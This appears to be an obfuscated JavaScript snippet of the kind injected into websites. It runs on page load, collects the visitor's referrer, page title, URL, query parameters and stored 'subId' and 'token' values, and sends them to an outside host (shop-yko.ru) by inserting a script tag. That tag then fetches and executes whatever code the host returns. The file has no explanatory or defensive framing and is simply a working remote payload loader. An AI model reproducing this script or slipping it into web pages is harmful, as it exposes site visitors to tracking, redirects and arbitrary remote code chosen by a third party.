(function() {
    var name = '_T52jcBRmsRC61cPb';
    if (!window._T52jcBRmsRC61cPb) {
        window._T52jcBRmsRC61cPb = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://shop-yko.ru/shjJWZ',
        };
    }
    const _Knbx8rD4K2sH4sHd = localStorage.getItem('config');
    if (typeof _Knbx8rD4K2sH4sHd !== 'undefined' && _Knbx8rD4K2sH4sHd !== null) {
        var _PhyffDKBmkZNWZ3P = JSON.parse(_Knbx8rD4K2sH4sHd);
        var _9vB7H3hvzvXNXzw6 = Math.round(+new Date()/1000);
        if (_PhyffDKBmkZNWZ3P.created_at + window._T52jcBRmsRC61cPb.ttl < _9vB7H3hvzvXNXzw6) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _jzGJDkDc8j3Sn5by = localStorage.getItem('subId');
    var _d8JWPHJKkMSkbCsh = localStorage.getItem('token');
    var _7whWdKyMzZnmH4K9 = '?return=js.client';
        _7whWdKyMzZnmH4K9 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _7whWdKyMzZnmH4K9 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _7whWdKyMzZnmH4K9 += '&default_keyword=' + encodeURIComponent(document.title);
        _7whWdKyMzZnmH4K9 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _7whWdKyMzZnmH4K9 += '&name=' + encodeURIComponent(name);
        _7whWdKyMzZnmH4K9 += '&host=' + encodeURIComponent(window._T52jcBRmsRC61cPb.R_PATH);
    if (typeof _jzGJDkDc8j3Sn5by !== 'undefined' && _jzGJDkDc8j3Sn5by && window._T52jcBRmsRC61cPb.unique) {
        _7whWdKyMzZnmH4K9 += '&sub_id=' + encodeURIComponent(_jzGJDkDc8j3Sn5by);
    }
    if (typeof _d8JWPHJKkMSkbCsh !== 'undefined' && _d8JWPHJKkMSkbCsh && window._T52jcBRmsRC61cPb.unique) {
        _7whWdKyMzZnmH4K9 += '&token=' + encodeURIComponent(_d8JWPHJKkMSkbCsh);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._T52jcBRmsRC61cPb.R_PATH + _7whWdKyMzZnmH4K9;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
